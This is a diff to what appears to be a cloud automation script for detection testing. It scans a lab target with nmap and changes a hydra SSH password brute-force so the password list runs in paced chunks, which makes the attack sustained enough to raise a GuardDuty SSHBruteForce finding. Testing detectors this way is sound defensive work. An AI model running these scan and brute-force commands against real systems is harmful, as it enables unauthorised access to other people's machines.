@@ -70,10 +70,20 @@ mainSteps:
         - '# --- 5개 전부 동시 실행 (t3.medium 4GB 전제) --------------------------------------'
         - '# nmap 은 자주 쓰는 포트만 본다(전체 -p- 는 필터링된 포트 재전송으로 5~15분씩 걸림).'
         - '{ echo "== [1] nmap =="; docker run --rm attacker:latest nmap -Pn -sV -T4 -p 22,80,443,3306,8080,8081 "{{ TargetHost }}"; } >"$D/1-nmap.txt" 2>&1 &'
-        - '# -t 1(직렬)로 일부러 늦춘다. -t 8 로는 258개 비밀번호가 8초 만에 끝나는데, GuardDuty
-        - '# SSHBruteForce 는 순간적인 연결 폭주가 아니라 한 IP 에서 지속되는 시도 패턴을 본다
-        - '# (2026-10-01 확인: 8초짜리 버스트로는 공격이 성공해도 finding 이 안 떴다).'
-        - '{ echo "== [2] hydra ssh ({{ SshUser }}) =="; docker run --rm -v $WL:/wl attacker:latest hydra -l "{{ SshUser }}" -P /wl/pass.txt -t 1 -I "ssh://{{ TargetHost }}"; } >"$D/2-hydra-ssh.txt" 2>&1 &'
+        - '# DVWA sshd 가 거부 응답이 워낙 빨라서(실측 ~54ms/시도) -t 1(직렬)로 늦춰도 258개가
+        - '# 14초 만에 끝난다 — GuardDuty SSHBruteForce 는 순간 폭주가 아니라 한 IP 에서
+        - '# 몇 분간 지속되는 시도 패턴을 본다(2026-10-01: -t 8→1 로는 안 떴다). 그래서 목록을
+        - '# 10 묶음으로 나눠 묶음 사이에 25초씩 쉰다 — 총 4~5분짜리 지속 공격이 된다.'
+        - '{'
+        - '  echo "== [2] hydra ssh ({{ SshUser }}) ==";'
+        - '  mkdir -p "$WL/chunks"'
+        - '  split -n l/10 "$WL/pass.txt" "$WL/chunks/c_" 2>/dev/null || split -l 26 "$WL/pass.txt" "$WL/chunks/c_"'
+        - '  for f in "$WL"/chunks/c_*; do'
+        - '    docker run --rm -v $WL:/wl attacker:latest hydra -l "{{ SshUser }}" -P "/wl/chunks/$(basename "$f")" -t 1 -I "ssh://{{ TargetHost }}"'
+        - '    sleep 25'
+        - '  done'
+        - '  rm -rf "$WL/chunks"'
+        - '} >"$D/2-hydra-ssh.txt" 2>&1 &'
         - 'if [ -n "{{ WebBaseUrl }}" ]; then'
         - '  # hydra 9.5 http-form 은 조건 필드에 F= 접두어를 붙이면 "no valid optional parameter
         - '  # type given: F" 로 파싱이 깨진다(2026-09-30 사고). 접두어 없이 실패 문자열만 쓴다.'
